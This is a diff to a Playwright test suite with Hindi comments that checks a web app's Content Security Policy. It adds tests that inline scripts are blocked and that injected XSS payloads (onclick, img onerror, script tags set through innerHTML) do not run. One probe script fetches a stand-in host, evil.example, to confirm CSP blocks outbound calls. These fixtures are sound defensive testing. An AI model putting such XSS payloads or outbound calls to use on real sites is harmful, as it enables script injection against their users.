@@ -722,12 +722,11 @@ test.describe('CSP और integrity', () => {
 
   test('CSP पराए सर्वर पर डेटा भेजना रोकती है और लॉग में "csp-block" (एक ही बार)', async ({ page }) => {
     await openApp(page);
-    await page.evaluate(async () => {
-      // page.evaluate पर CSP नहीं लगती, इसलिए असली page script की तरह <script> से — inline की इजाज़त है
-      const s = document.createElement('script');
-      s.textContent = 'window.__r=[];["https://evil.example/a","https://evil.example/b"].forEach(function(u){fetch(u).then(function(){__r.push("ok")},function(){__r.push("blocked")})});';
-      document.body.appendChild(s);
-    });
+    // page.evaluate पर CSP नहीं लगती, इसलिए असली page script की तरह अपने पते की <script src> से
+    // (v9.258 से inline <script> ही नहीं चलती — इसलिए नक़ली same-origin फ़ाइल)
+    await page.route('**/__csp-probe.js', (r) => r.fulfill({ contentType: 'application/javascript',
+      body: 'window.__r=[];["https://evil.example/a","https://evil.example/b"].forEach(function(u){fetch(u).then(function(){__r.push("ok")},function(){__r.push("blocked")})});' }));
+    await page.evaluate(() => { const s = document.createElement('script'); s.src = '__csp-probe.js'; document.body.appendChild(s); });
     await expect.poll(() => page.evaluate(() => window.__r && window.__r.length)).toBe(2);
     expect(await page.evaluate(() => window.__r)).toEqual(['blocked', 'blocked']);
     await expect.poll(() => page.evaluate(() => getLogs().filter((l) => l.c === 'csp-block').map((l) => l.m))).toEqual(['connect-src evil.example']);
@@ -738,6 +737,47 @@ test.describe('CSP और integrity', () => {
       document.head.appendChild(s);
     }));
     expect(ok).toBe('blocked');
+  });
+});
+
+// ── Security चरण 9 (v9.258): CSP script-src से 'unsafe-inline' हटा — XSS से डाला गया कोड browser ख़ुद रोके ──
+test.describe("CSP: inline कोड बंद (security, चरण 9)", () => {
+  test("CSP की script-src में 'unsafe-inline' नहीं (style-src में रह सकता है)", () => {
+    const html = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8');
+    const pol = /http-equiv="Content-Security-Policy" content="([^"]+)"/.exec(html)[1];
+    const dir = (n) => (pol.split(';').map((d) => d.trim()).find((d) => d.startsWith(n + ' ')) || '');
+    expect(dir('script-src')).not.toContain("'unsafe-inline'");
+    expect(dir('script-src')).toContain("'self'");
+  });
+
+  test('डाला गया inline onclick / onerror / <script> नहीं चलता (XSS जैसी हालत)', async ({ page }) => {
+    await openApp(page);
+    await page.evaluate(() => {
+      window.__xss = [];
+      const d = document.createElement('div');
+      // innerHTML से — जैसे कोई उपभोक्ता-नाम escHtml के बिना छप जाए
+      d.innerHTML = "<button id='xss-btn' onclick='window.__xss.push(1)'>x</button><img src='data:,' onerror='window.__xss.push(2)'>";
+      document.body.appendChild(d);
+      const s = document.createElement('script'); s.textContent = 'window.__xss.push(3)'; document.body.appendChild(s);
+    });
+    await page.click('#xss-btn');
+    await page.waitForTimeout(300);
+    expect(await page.evaluate(() => window.__xss)).toEqual([]);
+  });
+
+  test('JE login + कई स्क्रीन खोलने पर CSP कुछ नहीं रोकता (ऐप का अपना कोड inline नहीं)', async ({ page }) => {
+    await page.addInitScript(() => {
+      document.addEventListener('securitypolicyviolation', (e) => {
+        (window.__csp = window.__csp || []).push(e.effectiveDirective + ' ' + e.blockedURI + ' ' + (e.sourceFile || '').split('/').pop() + ':' + e.lineNumber);
+      });
+    });
+    await openApp(page);
+    await loginJE(page);
+    await page.waitForTimeout(500);
+    // बटन JS से चलें — नीचे की पट्टी, मेनू
+    await page.evaluate(() => { try { showHome(); } catch (e) { /* ठीक */ } });
+    await page.waitForTimeout(300);
+    expect(await page.evaluate(() => window.__csp || [])).toEqual([]);
   });
 });
 
